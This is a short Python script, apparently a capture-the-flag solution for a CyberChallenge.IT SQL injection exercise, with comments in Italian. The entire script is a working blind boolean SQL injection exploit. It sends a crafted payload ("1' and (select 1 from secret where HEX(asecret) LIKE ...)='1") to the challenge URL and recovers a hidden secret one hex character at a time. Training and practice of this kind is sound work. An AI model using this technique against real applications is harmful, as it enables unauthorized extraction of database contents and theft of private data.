from injection import Inj

inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            break
    else:
        break # Yup, i cicli for in Python hanno una sezione else.
              # Significa che abbiamo esaurito i caratteri del
              # dizionario.
              
print(bytes.fromhex(result).decode("ASCII"))
